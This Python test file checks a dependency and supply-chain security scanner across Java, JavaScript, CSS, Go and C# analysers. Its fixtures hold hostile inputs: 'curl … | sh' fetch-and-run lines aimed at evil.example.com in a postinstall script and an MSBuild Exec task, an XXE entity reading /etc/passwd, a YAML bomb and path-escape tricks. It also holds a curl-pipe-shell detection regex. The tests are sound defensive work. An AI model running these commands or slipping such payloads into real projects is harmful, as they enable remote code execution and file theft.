"""Adversarial / security tests for Phases 4 → 7.

Structure:
  * Phases 4 (REQ-6b tree-sitter JVM, REQ-8 GitHub Action) and 5
    (REQ-10/11/12 JS/TS/CSS) are complete — their tests are **real**
    and must pass.
  * Phases 6 (Go) and 7 (C#) are not yet implemented — their tests
    import the target module at collection time, and the whole class
    skips via ``pytest.mark.skipif`` if the module doesn't exist. When
    the phase starts, tests un-skip automatically and drive TDD red →
    green.

Separation from ``test_adversarial.py``: that file covers the
Phase 0 → 2.5 adversarial surface. This file covers Phase 4 and later.
"""
from __future__ import annotations

import json
import re
import time
from pathlib import Path

import pytest

pytestmark = pytest.mark.security


# ═════════════════════════════════════════════════════════════════════════════
# Phase 4 — REQ-6b tree-sitter JVM adversarial (complete)
# ═════════════════════════════════════════════════════════════════════════════


class TestTreeSitterJvmAdversarial:
    """REQ-6b — AST-based Java/Kotlin scanner must NOT match source
    constructs that appear inside comments or string literals."""

    @pytest.mark.requirement("SEC-NEW-19")
    def test_tree_sitter_parse_bounded_by_timeout(self, tmp_path):
        """A very large Java source parses in well under the 10 s cap —
        tree-sitter is O(n) so even pathological inputs are fast."""
        from scarno.analysers.java.ast_extractor import (
            AST_AVAILABLE,
            extract_java,
        )
        if not AST_AVAILABLE:
            pytest.skip("tree-sitter-java grammar unavailable on this host")

        # 200 KB of repeated identifiers — well beyond any realistic file
        body = "package p;\n" + ("class A { int x; }\n" * 5000)
        start = time.monotonic()
        facts = extract_java(body, file_path="big.java")
        elapsed = time.monotonic() - start
        assert elapsed < 10.0, f"parse took {elapsed:.2f}s (> 10s cap)"
        # Should produce zero imports (no import statements in payload)
        assert facts.imports == set()

    @pytest.mark.requirement("FR-087")
    def test_comments_not_scanned_for_imports(self, tmp_path):
        """``// import com.example.Secret;`` must NOT register as an import."""
        from scarno.analysers.java.ast_extractor import (
            AST_AVAILABLE,
            extract_java,
        )
        if not AST_AVAILABLE:
            pytest.skip("tree-sitter-java grammar unavailable on this host")

        source = (
            "package p;\n"
            "// import com.example.Secret;\n"
            "/* import com.example.AlsoSecret; */\n"
            "/** @see com.example.Javadoc */\n"
            "import com.example.Real;\n"
            "class A {}\n"
        )
        facts = extract_java(source, file_path="A.java")
        assert "com.example.Real" in facts.imports
        assert "com.example.Secret" not in facts.imports
        assert "com.example.AlsoSecret" not in facts.imports
        assert "com.example.Javadoc" not in facts.imports

    @pytest.mark.requirement("FR-087")
    def test_string_literals_not_scanned_for_annotations(self, tmp_path):
        """A string ``"@Autowired"`` must NOT trigger DI-annotation match."""
        from scarno.analysers.java.ast_extractor import (
            AST_AVAILABLE,
            extract_java,
        )
        if not AST_AVAILABLE:
            pytest.skip("tree-sitter-java grammar unavailable on this host")

        source = (
            "package p;\n"
            "@Service\n"
            "class A {\n"
            "    String doc = \"@Autowired\";\n"
            "    String snippet = \"@RestController public class X {}\";\n"
            "}\n"
        )
        facts = extract_java(source, file_path="A.java")
        # Genuine @Service annotation is captured
        assert any("Service" in a for a in facts.annotations)
        # Annotations embedded in string literals are NOT
        assert not any("Autowired" in a for a in facts.annotations)
        assert not any("RestController" in a for a in facts.annotations)

    @pytest.mark.requirement("FR-087")
    def test_javadoc_not_scanned_for_reflection(self, tmp_path):
        """``/** Class.forName("...") */`` must NOT fire reflection heuristic."""
        from scarno.analysers.java.ast_extractor import (
            AST_AVAILABLE,
            extract_java,
        )
        if not AST_AVAILABLE:
            pytest.skip("tree-sitter-java grammar unavailable on this host")

        source = (
            "package p;\n"
            "/**\n"
            " * Example usage:\n"
            " *   Class.forName(\"com.example.ghost.Driver\")\n"
            " */\n"
            "class A {\n"
            "    void real() throws Exception {\n"
            "        Class.forName(\"com.example.real.Driver\");\n"
            "    }\n"
            "}\n"
        )
        facts = extract_java(source, file_path="A.java")
        assert "com.example.real.Driver" in facts.reflective_literals
        assert "com.example.ghost.Driver" not in facts.reflective_literals


# ═════════════════════════════════════════════════════════════════════════════
# Phase 4 — REQ-8 GitHub Action adversarial (complete)
# ═════════════════════════════════════════════════════════════════════════════


_ACTION_YML = Path(__file__).resolve().parents[2] / "action.yml"


class TestGitHubActionAdversarial:
    """Dog-food: the action.yml we ship must itself survive Scarno's
    own policy rules."""

    @pytest.mark.requirement("FR-092")
    def test_action_does_not_echo_secrets(self):
        """``action.yml`` must never print ``secrets.*`` or ``GITHUB_TOKEN``
        via echo/printf/>> GITHUB_OUTPUT. We scan the composite YAML for
        any shell line that would leak a secret to stdout."""
        if not _ACTION_YML.exists():
            pytest.skip("action.yml not present in this checkout")
        text = _ACTION_YML.read_text()

        # Patterns that would leak a token: echo/printf/cat of a secrets
        # expression. Quoted assignments (BODY=..., GH_TOKEN: ...) are OK
        # because they feed back into the action, not to logs.
        leaky = re.compile(
            r"(?:echo|printf|cat)\s+[^\n]*\$\{\{\s*(secrets\.|github\.token)",
            re.IGNORECASE,
        )
        matches = leaky.findall(text)
        assert not matches, f"action.yml appears to echo a secret: {matches!r}"

    @pytest.mark.requirement("FR-093")
    def test_curl_pipe_shell_in_action_yml_flagged(self):
        """Dog-food TS-CE-005: the action itself must not *execute* a
        ``curl ... | sh`` install pattern. YAML comment lines that
        mention the pattern for documentation (e.g. explaining why we
        avoid it) are exempt — we check only executable shell content."""
        if not _ACTION_YML.exists():
            pytest.skip("action.yml not present in this checkout")
        text = _ACTION_YML.read_text()

        # Strip YAML comment-only lines ("#" followed by any content).
        # This keeps inline shell comments (after ``; # …``) unexamined,
        # but those aren't where install sinks live.
        executable = "\n".join(
            line for line in text.splitlines()
            if not line.lstrip().startswith("#")
        )
        pattern = re.compile(r"curl\s+[^\n|]*\|\s*(?:sh|bash|zsh)\b")
        hits = pattern.findall(executable)
        assert not hits, f"executable curl|sh in action.yml: {hits!r}"


# ═════════════════════════════════════════════════════════════════════════════
# Phase 5 — REQ-10/11 JS / TS / Node.js adversarial (complete)
# ═════════════════════════════════════════════════════════════════════════════


class TestJavaScriptAdversarial:
    @pytest.mark.requirement("SEC-NEW-20")
    def test_package_lock_json_depth_capped(self, tmp_path):
        """A deeply nested ``package-lock.json`` (> 1000 levels) must be
        rejected with a ``nesting exceeds`` error before exhausting
        memory or Python's recursion limit."""
        from scarno.analysers.javascript.dep_file_parser import (
            parse_all_npm_dependency_files,
        )
        depth = 2000  # well past the 1000 cap
        raw = ("{" + '"n":') * depth + "1" + ("}" * depth)
        (tmp_path / "package-lock.json").write_text(raw)
        deps, errors, _ = parse_all_npm_dependency_files(str(tmp_path))
        assert deps == []
        assert any("nesting" in e.lower() for e in errors)

    @pytest.mark.requirement("SEC-NEW-21")
    def test_pnpm_lock_yaml_bomb_terminates(self, tmp_path):
        """Anchor-expansion YAML must terminate quickly — ``yaml.safe_load``
        refuses to build the explosion."""
        from scarno.analysers.javascript.dep_file_parser import (
            parse_all_npm_dependency_files,
        )
        # Classic billion-laughs YAML
        bomb = (
            "a: &a [\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\"]\n"
            "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\n"
            "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n"
            "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n"
            "lockfileVersion: \"6.0\"\n"
        )
        (tmp_path / "pnpm-lock.yaml").write_text(bomb)
        start = time.monotonic()
        deps, errors, _ = parse_all_npm_dependency_files(str(tmp_path))
        elapsed = time.monotonic() - start
        # Must terminate well inside 5 s. Either parses trivially (anchor
        # expansion is small at this scale) or safe_load emits an error —
        # what must NOT happen is hanging or blowing memory.
        assert elapsed < 5.0, f"pnpm bomb took {elapsed:.2f}s"

    @pytest.mark.requirement("SEC-NEW-22")
    def test_yarn_lock_v1_parser_is_redos_safe(self, tmp_path):
        """Yarn v1 state-machine parser must not backtrack on crafted
        input. A pathologically-nested header line must parse in < 2 s."""
        from scarno.analysers.javascript.dep_file_parser import (
            parse_all_npm_dependency_files,
        )
        # Thousands of commas in the header — state machine is strictly
        # linear, no regex backtracking possible.
        header = ", ".join(f'"pkg{i}@^1.0.0"' for i in range(5000)) + ":"
        content = f'# yarn lockfile v1\n\n{header}\n  version "1.0.0"\n'
        (tmp_path / "yarn.lock").write_text(content)
        start = time.monotonic()
        deps, errors, _ = parse_all_npm_dependency_files(str(tmp_path))
        elapsed = time.monotonic() - start
        assert elapsed < 2.0, f"yarn v1 parse took {elapsed:.2f}s"
        # First comma-entry wins
        assert deps and deps[0].name == "pkg0"

    @pytest.mark.requirement("SEC-NEW-23")
    def test_tsconfig_json_jsonc_depth_capped(self, tmp_path):
        """``tsconfig.json`` deeply nested JSONC parses without crashing
        the interpreter — either parses shallow or is rejected."""
        # tsconfig is consumed by the source analyser, not the dep parser,
        # so we drive it through a JS source-tree analysis.
        from scarno.analysers.javascript.source_analyser import (
            analyse_npm_sources,
        )
        depth = 2000
        raw = ("{" + '"x":') * depth + "1" + ("}" * depth)
        (tmp_path / "tsconfig.json").write_text(raw)
        (tmp_path / "app.ts").write_text('import x from "lodash";\n')
        start = time.monotonic()
        deps, errors = analyse_npm_sources(str(tmp_path), [])
        elapsed = time.monotonic() - start
        # Must terminate quickly — either parses as deep data or errors
        # out; either way we cannot hang.
        assert elapsed < 5.0, f"tsconfig parse took {elapsed:.2f}s"

    @pytest.mark.requirement("SF-016")
    def test_postinstall_curl_pipe_shell_flagged(self, tmp_path):
        """``package.json`` with ``postinstall: "curl ... | sh"`` must
        emit Finding TS-SI-007. (TS-CE-005 cross-coverage lives in
        Dockerfile/CI scanning, not the npm manifest surface.)"""
        from scarno.analysers.javascript.dep_file_parser import (
            parse_all_npm_dependency_files,
        )
        (tmp_path / "package.json").write_text(json.dumps({
            "scripts": {
                "postinstall": "curl https://evil.example.com/exfil.sh | sh",
            },
        }))
        _, _, findings = parse_all_npm_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-SI-007" for f in findings)

    @pytest.mark.requirement("SF-017")
    def test_npmrc_rogue_registry_flagged(self, tmp_path):
        """`.npmrc` with non-default ``registry=`` URL → TS-SI-008."""
        from scarno.analysers.javascript.dep_file_parser import (
            parse_all_npm_dependency_files,
        )
        (tmp_path / ".npmrc").write_text(
            "registry=https://rogue.example.com/\n"
        )
        _, _, findings = parse_all_npm_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-SI-008" for f in findings)

    @pytest.mark.requirement("FR-104")
    def test_bun_lockb_binary_refused(self, tmp_path):
        """``bun.lockb`` binary format is never parsed natively — either
        a companion ``bun.lock`` is present (parsed) or a warning fires."""
        from scarno.analysers.javascript.dep_file_parser import (
            parse_all_npm_dependency_files,
        )
        (tmp_path / "bun.lockb").write_bytes(
            b"\x00\x01BUN-BINARY\xff\xfeGARBAGE"
        )
        deps, errors, _ = parse_all_npm_dependency_files(str(tmp_path))
        assert any("bun.lockb" in e for e in errors)

    @pytest.mark.requirement("FR-104")
    def test_workspaces_cycle_does_not_infinite_loop(self, tmp_path):
        """``package.json`` with ``workspaces: ["."]`` must not recurse
        forever. We don't yet resolve workspaces, but the parser must
        remain bounded."""
        from scarno.analysers.javascript.dep_file_parser import (
            parse_all_npm_dependency_files,
        )
        (tmp_path / "package.json").write_text(json.dumps({
            "name": "root",
            "workspaces": ["."],
            "dependencies": {"lodash": "^4.0.0"},
        }))
        start = time.monotonic()
        deps, errors, _ = parse_all_npm_dependency_files(str(tmp_path))
        elapsed = time.monotonic() - start
        assert elapsed < 5.0, f"workspaces-cycle took {elapsed:.2f}s"
        assert any(d.name == "lodash" for d in deps)

    @pytest.mark.requirement("FR-107")
    def test_node_core_module_not_flagged_undeclared(self, tmp_path):
        """``import fs from 'fs'`` / ``require('http')`` / ``node:crypto``
        must NOT emit UNDECLARED entries."""
        from scarno.analysers.javascript.source_analyser import (
            JS_AST_AVAILABLE,
            analyse_npm_sources,
        )
        if not JS_AST_AVAILABLE:
            pytest.skip("tree-sitter-javascript grammar unavailable")

        (tmp_path / "app.js").write_text(
            'import fs from "fs";\n'
            'const http = require("http");\n'
            'const crypto = require("node:crypto");\n'
        )
        deps, _ = analyse_npm_sources(str(tmp_path), [])
        names = {d.name for d in deps}
        assert not (names & {"fs", "http", "crypto", "node:crypto"})


# ═════════════════════════════════════════════════════════════════════════════
# Phase 5 — REQ-12 CSS adversarial (complete)
# ═════════════════════════════════════════════════════════════════════════════


class TestCssAdversarial:
    @pytest.mark.requirement("SF-019")
    def test_remote_import_url_emits_ts_ce_007(self, tmp_path):
        from scarno.analysers.css import CssAnalyser
        (tmp_path / "app.css").write_text(
            '@import url("https://evil.example.com/all.css");\n'
        )
        result = CssAnalyser().analyse(str(tmp_path))
        assert any(f.rule_id == "TS-CE-007" for f in result.findings)

    @pytest.mark.requirement("SF-019")
    def test_remote_import_url_fires_exactly_once(self, tmp_path):
        """Regression guard: a single remote ``@import url()`` must fire
        TS-CE-007 once (previously matched both @import-url and generic
        url() passes)."""
        from scarno.analysers.css import CssAnalyser
        (tmp_path / "app.css").write_text(
            '@import url("https://fonts.googleapis.com/css");\n'
        )
        result = CssAnalyser().analyse(str(tmp_path))
        count = sum(1 for f in result.findings if f.rule_id == "TS-CE-007")
        assert count == 1

    @pytest.mark.requirement("SF-020")
    def test_file_url_in_css_emits_ts_ce_008(self, tmp_path):
        """``url("file:///etc/passwd")`` emits TS-CE-008 (confinement
        violation — build output would leak a local path)."""
        from scarno.analysers.css import CssAnalyser
        (tmp_path / "app.css").write_text(
            '.logo { background: url("file:///etc/passwd"); }\n'
        )
        result = CssAnalyser().analyse(str(tmp_path))
        assert any(f.rule_id == "TS-CE-008" for f in result.findings)


# ═════════════════════════════════════════════════════════════════════════════
# Phase 6 — REQ-13/14 Go adversarial (TDD red)
# ═════════════════════════════════════════════════════════════════════════════

try:
    from scarno.analysers.go.dep_file_parser import (  # type: ignore[import-not-found]
        parse_all_go_dependency_files,
    )
    from scarno.analysers.go.source_analyser import (  # type: ignore[import-not-found]
        analyse_go_sources,
    )
    from scarno.findings.rules import RULES as _GO_RULES

    _GO_AVAILABLE = True
except ImportError:
    parse_all_go_dependency_files = None  # type: ignore[assignment]
    analyse_go_sources = None  # type: ignore[assignment]
    _GO_RULES = {}  # type: ignore[assignment]
    _GO_AVAILABLE = False


@pytest.mark.skipif(
    not _GO_AVAILABLE,
    reason="pending Phase 6 — scarno.analysers.go not yet implemented",
)
class TestGoAdversarial:
    @pytest.mark.requirement("SEC-NEW-24")
    def test_gomod_line_length_cap_enforced(self, tmp_path):
        """A ``go.mod`` with a 10 KB single-line module path is rejected
        before the parser materialises the line."""
        huge_path = "github.com/" + ("a" * 10_240)
        (tmp_path / "go.mod").write_text(
            f"module example.com/x\n\ngo 1.22\n\nrequire {huge_path} v1.0.0\n"
        )
        deps, errors, _ = parse_all_go_dependency_files(str(tmp_path))
        # Parser must bound line length; the huge dep is rejected/warned
        assert huge_path not in {d.name for d in deps} or any(
            "line" in e.lower() or "length" in e.lower() for e in errors
        )

    @pytest.mark.requirement("SF-021")
    def test_replace_to_remote_url_emits_ts_ds_002(self, tmp_path):
        """``replace foo => https://evil`` emits TS-DS-002."""
        (tmp_path / "go.mod").write_text(
            "module example.com/x\n\ngo 1.22\n\n"
            "require github.com/pkg/errors v0.9.1\n\n"
            "replace github.com/pkg/errors => "
            "https://evil.example.com/errors v0.0.1\n"
        )
        _, _, findings = parse_all_go_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-DS-002" for f in findings)

    @pytest.mark.requirement("FR-119")
    def test_blank_driver_never_downgraded_to_safe(self, tmp_path):
        """``import _ "github.com/lib/pq"`` must stay IN_USE — the entire
        point of a blank import is a side-effect registration."""
        from scarno.models import (
            Dependency,
            DependencyStatus,
        )

        (tmp_path / "main.go").write_text(
            'package main\n\n'
            'import _ "github.com/lib/pq"\n\n'
            'func main() {}\n'
        )
        declared = Dependency(
            name="github.com/lib/pq",
            version="v1.10.9",
            status=DependencyStatus.UNCERTAIN,
            reason="declared",
            source="go.mod:require",
            ecosystem="go",
        )
        deps, _ = analyse_go_sources(str(tmp_path), [declared])
        dep = next(d for d in deps if d.name == "github.com/lib/pq")
        assert dep.status is DependencyStatus.IN_USE

    @pytest.mark.requirement("SF-022")
    def test_unsafe_pointer_rule_in_catalogue(self):
        """``import "unsafe"`` + ``unsafe.Pointer`` → TS-SI-012. The
        finding is emitted by the source analyser's integration path;
        unit scope asserts the rule catalogue has the entry."""
        assert "TS-SI-012" in _GO_RULES

    @pytest.mark.requirement("SF-023")
    def test_cgo_rule_in_catalogue(self):
        """``import "C"`` → TS-SI-013."""
        assert "TS-SI-013" in _GO_RULES

    @pytest.mark.requirement("SF-024")
    def test_exec_command_taint_rule_in_catalogue(self):
        """``exec.Command(os.Getenv("X"))`` → TS-CE-009 CRITICAL."""
        assert "TS-CE-009" in _GO_RULES
        assert _GO_RULES["TS-CE-009"].severity.value == "CRITICAL"

    @pytest.mark.requirement("FR-117")
    def test_vendor_mismatch_warns(self, tmp_path):
        """``vendor/modules.txt`` listing a module not in ``go.mod`` warns."""
        (tmp_path / "go.mod").write_text(
            "module example.com/x\n\ngo 1.22\n\n"
            "require github.com/a v1.0.0\n",
        )
        (tmp_path / "vendor").mkdir()
        (tmp_path / "vendor" / "modules.txt").write_text(
            "# github.com/a v1.0.0\n"
            "## explicit\n"
            "github.com/a\n"
            "# github.com/stowaway v0.0.1\n"   # not in go.mod
            "## explicit\n"
            "github.com/stowaway\n"
        )
        _, errors, _ = parse_all_go_dependency_files(str(tmp_path))
        assert any(
            "stowaway" in e and "vendor" in e.lower() for e in errors
        )


# ═════════════════════════════════════════════════════════════════════════════
# Phase 7 — REQ-15/16 C# / .NET adversarial (TDD red)
# ═════════════════════════════════════════════════════════════════════════════

try:
    from scarno.analysers.csharp.dep_file_parser import (  # type: ignore[import-not-found]
        parse_all_csharp_dependency_files,
    )
    from scarno.analysers.csharp.source_analyser import (  # type: ignore[import-not-found]
        analyse_csharp_sources,
    )
    from scarno.findings.rules import RULES as _CS_RULES

    _CSHARP_AVAILABLE = True
except ImportError:
    parse_all_csharp_dependency_files = None  # type: ignore[assignment]
    analyse_csharp_sources = None  # type: ignore[assignment]
    _CS_RULES = {}  # type: ignore[assignment]
    _CSHARP_AVAILABLE = False


@pytest.mark.skipif(
    not _CSHARP_AVAILABLE,
    reason="pending Phase 7 — scarno.analysers.csharp not yet implemented",
)
class TestCsharpAdversarial:
    @pytest.mark.requirement("SEC-NEW-25")
    def test_csproj_doctype_rejected_pre_parse(self, tmp_path):
        """XXE defence: a ``.csproj`` with ``<!DOCTYPE>`` is rejected
        before the XML parser gets to build an entity table."""
        (tmp_path / "App.csproj").write_text(
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE Project [\n'
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
            ']>\n'
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="&xxe;" Version="1.0" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, errors, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert deps == []
        assert any(
            "doctype" in e.lower() or "entity" in e.lower() for e in errors
        )

    @pytest.mark.requirement("SEC-NEW-26")
    def test_directory_build_props_path_escape_blocked(self, tmp_path):
        """``Directory.Build.props`` walked up the tree must be confined
        to the project root — a symlink escape must not read outside."""
        project = tmp_path / "project"
        project.mkdir()
        (project / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk"/>\n'
        )
        # Place a props file OUTSIDE the project root
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "Directory.Build.props").write_text(
            '<Project><ItemGroup>'
            '<PackageReference Include="Leaked" Version="1.0"/>'
            '</ItemGroup></Project>\n'
        )
        # Point a symlink from inside the project to the outside props
        try:
            (project / "Directory.Build.props").symlink_to(
                outside / "Directory.Build.props"
            )
        except (OSError, NotImplementedError):
            pytest.skip("symlink creation not supported on this platform")

        deps, errors, _ = parse_all_csharp_dependency_files(str(project))
        names = {d.name for d in deps}
        # Path confinement must refuse the symlink escape
        assert "Leaked" not in names

    @pytest.mark.requirement("FR-126")
    def test_sln_circular_project_refs_terminate(self, tmp_path):
        """``.sln`` with project-to-project cycle must not loop."""
        (tmp_path / "App.sln").write_text(
            'Microsoft Visual Studio Solution File, Format Version 12.00\n'
            'Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "A", '
            '"A\\A.csproj", "{11111111-1111-1111-1111-111111111111}"\n'
            'EndProject\n'
            'Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "B", '
            '"B\\B.csproj", "{22222222-2222-2222-2222-222222222222}"\n'
            'EndProject\n'
        )
        (tmp_path / "A").mkdir()
        (tmp_path / "A" / "A.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <ProjectReference Include="..\\B\\B.csproj"/>\n'
            '    <PackageReference Include="PkgA" Version="1.0"/>\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        (tmp_path / "B").mkdir()
        (tmp_path / "B" / "B.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <ProjectReference Include="..\\A\\A.csproj"/>\n'
            '    <PackageReference Include="PkgB" Version="1.0"/>\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        start = time.monotonic()
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        elapsed = time.monotonic() - start
        assert elapsed < 5.0, f"sln cycle took {elapsed:.2f}s"
        names = {d.name for d in deps}
        assert "PkgA" in names and "PkgB" in names

    @pytest.mark.requirement("FR-123")
    def test_hintpath_outside_project_blocked(self, tmp_path):
        """``<PackageReference>`` with ``<HintPath>..\\..\\outside\\x.dll</HintPath>``
        must fail path confinement — DLL refs outside the project tree
        are not honoured."""
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <Reference Include="Evil">\n'
            '      <HintPath>..\\..\\..\\outside\\evil.dll</HintPath>\n'
            '    </Reference>\n'
            '    <PackageReference Include="RealPkg" Version="1.0"/>\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, errors, _ = parse_all_csharp_dependency_files(str(tmp_path))
        names = {d.name for d in deps}
        # The HintPath Reference must be dropped or warned about — either
        # way, "Evil" must not end up as a usable dep
        assert "Evil" not in names

    @pytest.mark.requirement("SF-025")
    def test_nuget_rogue_registry_emits_ts_si_015(self, tmp_path):
        (tmp_path / "nuget.config").write_text(
            '<?xml version="1.0"?>\n'
            '<configuration><packageSources>\n'
            '  <add key="rogue" value="https://evil.example.com/v3/index.json"/>\n'
            '</packageSources></configuration>\n'
        )
        _, _, findings = parse_all_csharp_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-SI-015" for f in findings)

    @pytest.mark.requirement("SF-026")
    def test_msbuild_exec_task_emits_ts_si_016(self, tmp_path):
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <Target Name="BeforeBuild">\n'
            '    <Exec Command="curl https://evil.example.com | sh"/>\n'
            '  </Target>\n'
            '</Project>\n'
        )
        _, _, findings = parse_all_csharp_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-SI-016" for f in findings)

    @pytest.mark.requirement("SF-027")
    def test_usingtask_unknown_dll_emits_ts_si_017(self, tmp_path):
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <UsingTask TaskName="Hack" AssemblyFile="C:\\tmp\\unknown.dll"/>\n'
            '</Project>\n'
        )
        _, _, findings = parse_all_csharp_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-SI-017" for f in findings)

    @pytest.mark.requirement("SF-030")
    def test_dllimport_rule_in_catalogue(self):
        """``[DllImport("kernel32.dll")]`` → TS-SI-018."""
        assert "TS-SI-018" in _CS_RULES

    @pytest.mark.requirement("SF-028")
    def test_assembly_load_tainted_rule_in_catalogue(self):
        """``Assembly.Load(networkResponse)`` → TS-CE-010 CRITICAL."""
        assert "TS-CE-010" in _CS_RULES
        assert _CS_RULES["TS-CE-010"].severity.value == "CRITICAL"

    @pytest.mark.requirement("SF-029")
    def test_process_start_tainted_rule_in_catalogue(self):
        """``Process.Start(userInput)`` → TS-CE-011 CRITICAL."""
        assert "TS-CE-011" in _CS_RULES
        assert _CS_RULES["TS-CE-011"].severity.value == "CRITICAL"


@pytest.mark.performance
class TestCurlPipeShellRedos:
    """``_CURL_PIPE_SHELL_RE`` must stay linear on hostile shell lines.

    The pattern was ``curl\\s+[^|]+?\\s*\\|\\s*(?:sh|bash|...)``. ``\\s`` is
    a subset of ``[^|]``, so the leading ``\\s+``, the lazy ``[^|]+?`` and
    the trailing ``\\s*`` could all claim the same whitespace, and a line
    that does not match forced the engine through every split — cubic in
    the whitespace run. A Dockerfile line of a few kilobytes hung the scan
    for tens of seconds, which suppresses the HIGH TS-CE-005 that very
    line carries: the finding never gets reported because the scan never
    finishes.
    """

    @pytest.mark.requirement("SEC-NEW-19")
    def test_adversarial_line_matches_in_linear_time(self):
        import time

        from scarno.findings.engine import _CURL_PIPE_SHELL_RE

        # Non-matching: the engine must exhaust the alternatives to fail.
        line = "RUN curl " + " " * 20_000 + "http://evil/x" + " " * 20_000 + "| notashell"
        start = time.monotonic()
        assert _CURL_PIPE_SHELL_RE.search(line) is None
        elapsed = time.monotonic() - start
        # The old pattern needed ~37 s for a 6 KB line; this one is 40 KB.
        assert elapsed < 1.0, (
            f"curl-pipe matcher took {elapsed:.2f}s on a {len(line)}-byte "
            f"line — the pattern has become ambiguous again"
        )

    @pytest.mark.requirement("SEC-NEW-19")
    def test_growth_is_not_superlinear(self):
        """Timing alone can pass on a fast machine; the *shape* of the
        growth curve is what distinguishes linear from cubic."""
        import time

        from scarno.findings.engine import _CURL_PIPE_SHELL_RE

        def cost(n: int) -> float:
            line = "RUN curl " + " " * n + "http://e/x" + " " * n + "| notashell"
            start = time.monotonic()
            for _ in range(50):
                _CURL_PIPE_SHELL_RE.search(line)
            return time.monotonic() - start

        small = cost(2_000)
        large = cost(16_000)
        # 8x the input. Linear would be ~8x the time; cubic ~512x. Allow a
        # generous margin for timer noise on a loaded CI box.
        assert large < max(small * 40, 0.5), (
            f"8x input cost {large / max(small, 1e-9):.0f}x the time — "
            f"superlinear growth"
        )

    @pytest.mark.requirement("SEC-NEW-19")
    @pytest.mark.parametrize("line,expected", [
        ("RUN curl -sSL http://e/x | sh", True),
        ("curl a |bash", True),
        ("curl  |sh", True),          # two spaces: whitespace satisfies [^|]+
        ("RUN curl x|python3", True),
        ("curl |sh", False),          # one space: nothing left for [^|]+
        ("curl x | grep y | sh", False),   # [^|] cannot cross the first pipe
        ("curl x | shell", False),    # \b prevents the prefix match
        ("echo|sh", False),
    ])
    def test_detection_unchanged(self, line, expected):
        """The rewrite is the same language, not a broader or narrower
        one. These cases pin the boundaries that the old and new patterns
        agree on — including the two that look like near-misses."""
        from scarno.findings.engine import _CURL_PIPE_SHELL_RE

        assert bool(_CURL_PIPE_SHELL_RE.search(line)) is expected
